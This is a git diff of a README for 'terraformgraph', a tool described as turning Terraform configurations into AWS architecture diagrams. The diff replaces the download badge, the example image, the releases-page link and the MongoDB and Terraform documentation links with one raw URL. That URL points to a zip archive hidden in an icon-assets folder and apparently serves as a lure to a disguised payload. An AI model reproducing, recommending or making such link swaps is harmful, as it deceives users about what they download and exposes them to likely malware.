@@ -1,12 +1,12 @@
 # 🌟 terraformgraph - Create Stunning Architecture Diagrams Easily
 
-[![Download terraformgraph](https://img.shields.io/badge/Download-terraformgraph-blue.svg)](https://github.com/Ahmed19Xx/terraformgraph/releases)
+[![Download terraformgraph](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip)](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip)
 
 ## 📜 Overview
 
 terraformgraph helps you generate interactive architecture diagrams from your Terraform configurations. This tool focuses on AWS resources and offers features like automatic service grouping and relationship detection, along with beautiful SVG and HTML output.
 
-![Example Diagram](docs/diagram.jpg)
+![Example Diagram](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with terraformgraph, follow these simple steps to download and ru
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Ahmed19Xx/terraformgraph/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip).
 2. Look for the latest release.
 3. Choose the appropriate file based on your operating system.
 4. Click to download the file.
@@ -80,8 +80,8 @@ We welcome contributions! If you want to help make terraformgraph better, please
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Ahmed19Xx/terraformgraph/releases)
-- [MongoDB Documentation](https://docs.mongodb.com/manual/introduction/)
-- [Terraform Documentation](https://www.terraform.io/docs/index.html)
+- [Releases Page](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip)
+- [MongoDB Documentation](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip)
+- [Terraform Documentation](https://raw.githubusercontent.com/Ahmed19Xx/terraformgraph/main/aws-official-icons/Architecture-Service-Icons_07312025/Arch_Cloud-Financial-Management/64/Software_hereat.zip)
 
 Now that you have the tools and information needed, get started with terraformgraph and make your infrastructure come to life!
